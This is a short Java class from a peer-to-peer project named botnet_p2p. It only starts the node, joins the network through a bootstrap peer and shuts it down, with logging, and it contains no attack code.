package botnet_p2p.application_layer;

import botnet_p2p.business_logic_layer.BusinessLogicLayer;
import botnet_p2p.model.Peer;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;

public class ApplicationLayer {
    private static final Logger logger = LogManager.getLogger(ApplicationLayer.class);

    private BusinessLogicLayer businessLogicLayer;

    public ApplicationLayer(BusinessLogicLayer businessLogicLayer) {
        this.businessLogicLayer = businessLogicLayer;
    }

    public void launchClient(Peer bootstrapNode) throws IOException, InterruptedException {

        // blocking
        businessLogicLayer.joinNetwork(bootstrapNode);
        logger.info("bootstrap finished");

        // non blocking
        businessLogicLayer.start();
    }

    public void startWithoutBootstrapping() {
        businessLogicLayer.start();
    }


    public void shutdown() {
        logger.info("closing");
        businessLogicLayer.shutdown();
    }
}
